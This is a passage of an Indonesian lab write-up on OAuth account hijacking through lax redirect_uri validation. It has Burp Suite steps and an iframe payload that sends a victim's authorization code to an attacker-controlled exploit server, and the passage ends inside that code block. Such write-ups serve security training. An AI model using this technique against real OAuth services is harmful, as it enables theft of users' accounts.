# Catatan Lab: OAuth Hijacking via redirect_uri

## Mengenal Celah Keamanan
Celah keamanan ini terjadi karena kurang ketatnya proses validasi parameter `redirect_uri` di sisi server penyedia OAuth (*OAuth Provider*). Server mengizinkan penyerang untuk mengubah tujuan pengiriman kode otorisasi (*authorization code*) ke domain luar yang tidak terdaftar di daftar putih (*whitelist*).

1. **Lemahnya Validasi redirect_uri:** Aplikasi web menggunakan alur OAuth untuk login, tetapi server OAuth tidak melakukan pencocokan string secara utuh (*exact match*) terhadap parameter `redirect_uri`. Hal ini memungkinkan penyerang untuk mengarahkan alur *callback* ke server pihak ketiga.
2. **Dampak Bagi Korban:** Ketika korban memicu request login OAuth yang telah dimanipulasi ini, server OAuth akan menghasilkan kode akses dan mengirimkannya ke server penyerang. Penyerang kemudian dapat mencuri kode tersebut untuk ditukarkan dengan *access token* akun korban.

---

## Tahapan Eksploitasi

1. **Analisis Request OAuth (Recon):**  
   Buka Burp Suite dan klik tombol login menggunakan opsi pihak ketiga (OAuth) pada web target. Tangkap request HTTP GET yang mengarah ke endpoint otorisasi server OAuth (biasanya berbentuk `/auth?client_id=...&redirect_uri=...`). Salin URL lengkap tersebut ke Burp Repeater untuk diuji.

2. **Uji Validasi redirect_uri:**  
   Ubah nilai parameter `redirect_uri` pada request yang telah ditangkap. Ganti domain aslinya menjadi domain *exploit server* yang disediakan oleh lab, namun tetap pertahankan parameter lainnya seperti `client_id`, `response_type`, dan `scope`. Kirim request tersebut dan pastikan server OAuth tidak menolak (*tidak menghasilkan error 400 Bad Request*).

3. **Menyiapkan Payload di Exploit Server:**  
   Masuk ke panel *exploit server* lab. Pada bagian **Body**, buat skrip otomatisasi (misalnya menggunakan tag `<iframe>` atau JavaScript) untuk memaksa browser korban memicu alur OAuth dengan `redirect_uri` palsu yang mengarah ke log server kita. 
   
   Contoh struktur payload pada berkas HTML di exploit server:
   ```html
   <iframe src="[https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email](https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email)"></iframe>
